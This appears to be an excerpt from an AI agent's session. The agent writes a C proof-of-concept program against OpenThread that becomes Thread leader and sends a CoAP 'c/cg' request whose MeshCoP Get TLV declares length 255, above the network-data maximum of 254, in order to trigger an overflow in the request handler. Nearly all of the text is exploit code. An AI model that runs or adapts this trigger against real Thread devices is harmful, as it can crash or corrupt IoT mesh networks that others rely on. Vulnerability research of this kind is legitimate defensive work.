1. Creates an OpenThread instance
2. Becomes leader
3. Constructs a CoAP message with URI path "c/cg" and a MeshCoP Get TLV with length 255
4. Sends it to the CoAP server internally

This bypasses the radio/MAC/6LoWPAN/IPv6/UDP layers entirely.
COMMAND:
cat > /workspace/poc_generator.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openthread/instance.h>
#include <openthread/ip6.h>
#include <openthread/link.h>
#include <openthread/tasklet.h>
#include <openthread/thread.h>
#include <openthread/thread_ftd.h>
#include <openthread/coap.h>
#include <openthread/meshcop.h>
#include <openthread/platform/radio.h>

#include "common/code_utils.hpp"

#define MAX_ITERATIONS 200

int main(int argc, char *argv[])
{
    otInstance *instance = NULL;
    otMessage *message = NULL;
    otMessageInfo messageInfo;
    otError error;

    // Initialize
    instance = otInstanceInitSingle();
    otIp6SetEnabled(instance, true);
    otThreadSetEnabled(instance, true);
    otThreadBecomeLeader(instance);

    // Process tasklets to complete initialization
    for (int i = 0; i < 50; i++)
    {
        while (otTaskletsArePending(instance))
        {
            otTaskletsProcess(instance);
        }
    }

    // Create a CoAP message
    // Use POST method (CoAP code 0x02) with URI path "c/cg"
    message = otCoapNewMessage(instance, NULL);
    if (!message)
    {
        printf("Failed to create CoAP message\n");
        return 1;
    }

    otCoapMessageInit(message, OT_COAP_TYPE_NON_CONFIRMABLE, OT_COAP_CODE_POST);
    otCoapMessageGenerateToken(message, 2);
    otCoapMessageAppendUriPathOptions(message, "c/cg");
    otCoapMessageSetPayloadMarker(message);

    // Append MeshCoP TLV with type = kGet (13) and length = 255
    // TLV format: [1 byte type][1 byte length][length bytes value]
    uint8_t tlv_type = 13;  // MeshCoP::Tlv::kGet
    uint8_t tlv_length = 255;  // > NetworkData::kMaxSize (254)
    
    // Write TLV header
    error = otMessageAppend(message, &tlv_type, 1);
    error = otMessageAppend(message, &tlv_length, 1);
    
    // Write 255 bytes of value (doesn't matter what, but we need to write them)
    // Actually, the CoAP message body is limited, but the TLV length field is what matters
    // The aMessage.Read will clamp to available bytes, but length stays 255
    uint8_t dummy = 0;
    for (int i = 0; i < 255; i++)
    {
        error = otMessageAppend(message, &dummy, 1);
    }

    printf("CoAP message created, length: %d\n", otMessageGetLength(message));

    // Set up message info for local delivery
    memset(&messageInfo, 0, sizeof(messageInfo));
    messageInfo.mPeerPort = 5683;  // CoAP port

    // Send the message to the CoAP server
    error = otCoapSendRequest(instance, message, &messageInfo);
    printf("otCoapSendRequest returned: %d\n", error);

    // Process tasklets to trigger the handler
    for (int i = 0; i < MAX_ITERATIONS; i++)
    {
        while (otTaskletsArePending(instance))
        {
            otTaskletsProcess(instance);
        }
    }

    printf("Done\n");
    return 0;
}
EOF
